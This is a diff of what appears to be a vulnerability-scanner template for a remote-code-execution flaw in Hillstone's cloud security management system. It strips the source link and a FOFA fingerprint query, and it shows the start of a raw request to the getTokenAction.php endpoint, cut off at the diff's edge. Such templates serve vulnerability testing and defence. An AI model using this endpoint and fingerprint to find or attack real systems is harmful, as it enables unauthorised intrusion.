@@ -3,12 +3,8 @@ info:
   name: 山石网科云鉴安全管理系统 ajaxActions RCE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ysbg0edwneyb3y37'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ysbg0edwneyb3y37
-    fofa: body=山石云鉴主机安全管理系统||icon_hash="572290418"
 http:
 - raw:
   - 'GET /master/ajaxActions/getTokenAction.php HTTP/1.1
